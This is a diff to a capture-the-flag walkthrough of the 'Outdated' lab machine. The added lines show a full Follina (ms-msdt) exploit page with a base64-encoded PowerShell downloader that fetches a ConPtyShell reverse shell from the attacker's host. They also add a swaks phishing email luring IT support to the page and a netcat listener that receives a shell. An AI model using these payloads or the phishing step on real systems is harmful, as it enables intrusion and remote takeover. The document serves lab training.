@@ -5,9 +5,6 @@ TARGET=10.10.11.175
 ```
 
 ```bash
-```
-
-```bash
 $ sudo nmap -p- --min-rate 10000 $TARGET 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 18:51 PDT
 Nmap scan report for 10.10.11.175
@@ -332,7 +329,7 @@ Host: 10.10.14.3
 Connection: Keep-Alive
 ```
 
-> WindowsPowerShell/5.1.19041.906 = KB5000842
+> WindowsPowerShell/5.1.**19041.906** = KB5000842
 
 ![KB5000842](images/KB5000842.png)
 
@@ -355,6 +352,18 @@ $ wget https://github.com/antonioCoco/ConPtyShell/raw/master/Invoke-ConPtyShell.
 2024-06-23 00:20:55 (2.03 MB/s) - ‘www/Invoke-ConPtyShell.ps1’ saved [72846/72846]
 
 $ echo "Invoke-ConPtyShell 10.10.14.3 9001" >> www/Invoke-ConPtyShell.ps1
+
+$ tail follina.py/www/Invoke-ConPtyShell.ps1 
+
+class MainClass
+{
+    static void Main(string[] args)
+    {
+        Console.Out.Write(ConPtyShellMainClass.ConPtyShellMain(args));
+    }
+}
+
+"@;Invoke-ConPtyShell 10.10.14.3 9001
 ```
 
 ```bash
@@ -365,8 +374,56 @@ Serving payload on http://localhost:80/exploit.html
 ```
 
 ```bash
+$ tail follina.py/www/exploit.html          
+...
+tristique arcu, et laoreet purus elit ac lectus. Ut venenatis tempus magna, non varius augue consectetur ut.
+
+Etiam elit risus, ullamcorper cursus nisl at, ultrices aliquet turpis. Maecenas vitae odio non dolor venenatis varius eu ac sem. Phasellus id tortor tellus. Ut vehicula, justo ac porta facilisis, mi sapien efficitur ipsum, sit fusce.
+</p>
+<script>
+    location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwBJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAuAHAAcwAxACcAKQA='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\"";
+</script>
+
+</body>
+</html>
+```
+
+```bash
 $ stty raw -echo; (stty size; cat) | nc -lvnp 9001
 listening on [any] 9001 ...
+```
+
+```bash
+$ swaks --to itsupport@outdated.htb --from kali@hacker.com --header "Subject: Web" --body "please click here http://10.10.14.3/exploit.html" --server $TARGET
+=== Trying 10.10.11.175:25...
+=== Connected to 10.10.11.175.
+<-  220 mail.outdated.htb ESMTP
+ -> EHLO kali
+<-  250-mail.outdated.htb
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> MAIL FROM:<kali@hacker.com>
+<-  250 OK
+ -> RCPT TO:<itsupport@outdated.htb>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> Date: Sun, 23 Jun 2024 09:41:04 -0700
+ -> To: itsupport@outdated.htb
+ -> From: kali@hacker.com
+ -> Subject: Web
+ -> Message-Id: <20240623094104.009194@kali>
+ -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+ -> 
+ -> please click here http://10.10.14.3/exploit.html
+ -> 
+ -> 
+ -> .
+<-  250 Queued (11.000 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
 ```
 
 ```bash
@@ -387,6 +444,9 @@ Try the new cross-platform PowerShell https://aka.ms/pscore6
 PS C:\Users\btables\AppData\Local\Temp\SDIAG_7a49cd60-49a5-405b-a268-52e1ce0bde5f> whoami
 outdated\btables
 ```
+
+## need to get back here
+
 
 ```bash
 ```
